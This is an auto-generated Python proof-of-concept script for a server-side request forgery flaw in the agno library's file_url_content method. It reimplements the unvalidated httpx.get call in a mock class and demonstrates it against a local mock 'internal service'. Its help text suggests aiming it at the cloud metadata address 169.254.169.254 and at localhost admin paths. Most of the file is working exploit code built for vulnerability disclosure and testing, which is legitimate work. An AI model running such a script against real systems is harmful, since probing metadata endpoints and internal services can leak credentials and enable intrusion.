#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: ssrf-004
# Sink: file_url_content
# Auto-generated — run with: python3 ssrf_function_url_content_uses_file_url_content.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in agno library (file_url_content)

Vulnerability: The file_url_content method in agno/media.py calls
httpx.get(self.url) without any validation, allowlisting, or redirect
handling. The URL is taken from self.url, which is attacker-controlled.

Impact: An attacker can make the server send HTTP requests to internal
services, cloud metadata endpoints, or other internal resources.

This PoC demonstrates the vulnerability by:
1. Setting up a simple HTTP server to simulate an internal service
2. Creating an agno object with a malicious URL pointing to the internal service
3. Triggering the vulnerable file_url_content method
4. Showing that the internal service receives the request

Usage:
    python3 poc_ssrf.py [--target TARGET_URL]

    If --target is provided, the PoC will attempt to fetch that URL.
    Otherwise, it starts a local server and demonstrates SSRF to localhost.
"""

import argparse
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# Try to import httpx (the library used by agno)
try:
    import httpx
except ImportError:
    print("[!] httpx is required. Install with: pip install httpx")
    sys.exit(1)


class MockInternalHandler(BaseHTTPRequestHandler):
    """Simulates an internal service that should not be accessible."""
    
    def do_GET(self):
        """Handle GET requests and log them."""
        print(f"[!] SSRF SUCCESS! Internal service received request:")
        print(f"    Path: {self.path}")
        print(f"    Headers: {dict(self.headers)}")
        
        # Send a response that mimics an internal service
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Internal service response - SSRF confirmed!")
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass


class VulnerableMedia:
    """
    Simulates the vulnerable agno media class.
    In the real library, this would be agno.media.Media or similar.
    """
    
    def __init__(self, url: str):
        self.url = url
    
    def file_url_content(self):
        """
        Vulnerable method - directly uses self.url in httpx.get
        without any validation.
        """
        if self.url:
            try:
                print(f"[*] Attempting to fetch: {self.url}")
                response = httpx.get(self.url, follow_redirects=True)
                content = response.content
                mime_type = response.headers.get("Content-Type", "").split(";")[0]
                print(f"[+] Successfully fetched content")
                print(f"    Status: {response.status_code}")
                print(f"    Content-Type: {mime_type}")
                print(f"    Content length: {len(content)} bytes")
                if len(content) < 500:
                    print(f"    Content: {content.decode('utf-8', errors='replace')}")
                return content, mime_type
            except Exception as e:
                print(f"[-] Failed to download file from {self.url}: {str(e)}")
                return None
        else:
            print("[-] No URL provided")
            return None


def start_internal_server(port: int = 8080):
    """Start a mock internal HTTP server on localhost."""
    server = HTTPServer(("127.0.0.1", port), MockInternalHandler)
    print(f"[*] Mock internal service running on http://127.0.0.1:{port}")
    print(f"    This simulates an internal service that should NOT be accessible")
    print(f"    from the vulnerable application.")
    
    # Start server in a separate thread
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    return server


def demonstrate_ssrf(target_url: str = None):
    """
    Demonstrate the SSRF vulnerability.
    
    If target_url is provided, attempt to fetch it directly.
    Otherwise, start a local server and demonstrate SSRF to localhost.
    """
    
    if target_url:
        print(f"\n[*] Testing SSRF with provided target: {target_url}")
        print(f"    This will attempt to fetch the URL using the vulnerable method.")
        print(f"    If this is an internal service, you should see the request logged.\n")
        
        media = VulnerableMedia(url=target_url)
        result = media.file_url_content()
        
        if result:
            print("\n[+] SSRF demonstration completed successfully!")
            print("    The vulnerable method fetched the URL without validation.")
        else:
            print("\n[-] Failed to fetch the URL. Check if the target is reachable.")
        
        return
    
    # Default demonstration: start local server and exploit
    print("\n[*] Starting default SSRF demonstration...")
    print("    This will start a mock internal service on localhost:8080")
    print("    and then use the vulnerable method to access it.\n")
    
    # Start mock internal service
    server = start_internal_server(8080)
    time.sleep(0.5)  # Give server time to start
    
    # Create vulnerable media object with URL pointing to internal service
    internal_url = "http://127.0.0.1:8080/internal/secret"
    print(f"\n[*] Creating vulnerable media object with URL: {internal_url}")
    print(f"    This URL points to our mock internal service.\n")
    
    media = VulnerableMedia(url=internal_url)
    result = media.file_url_content()
    
    if result:
        print("\n[+] SSRF DEMONSTRATION SUCCESSFUL!")
        print("    The vulnerable method fetched content from the internal service.")
        print("    This proves that an attacker can access internal resources.")
    else:
        print("\n[-] SSRF demonstration failed.")
        print("    Check if port 8080 is available or if there are network issues.")
    
    # Cleanup
    server.shutdown()


def main():
    """Main entry point with argument parsing."""
    parser = argparse.ArgumentParser(
        description="PoC for SSRF vulnerability in agno library",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Default demonstration (starts local server)
  python3 poc_ssrf.py
  
  # Test against a specific target
  python3 poc_ssrf.py --target http://169.254.169.254/latest/meta-data/
  
  # Test against a local service
  python3 poc_ssrf.py --target http://localhost:3000/admin
        """
    )
    
    parser.add_argument(
        "--target",
        type=str,
        help="Target URL to test SSRF against (e.g., http://169.254.169.254/latest/meta-data/)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("SSRF Proof-of-Concept for agno library")
    print("=" * 60)
    print()
    print("[*] Vulnerability: file_url_content uses httpx.get(self.url)")
    print("    without validation, allowlisting, or redirect handling.")
    print()
    
    try:
        demonstrate_ssrf(args.target)
    except KeyboardInterrupt:
        print("\n[-] Demonstration interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
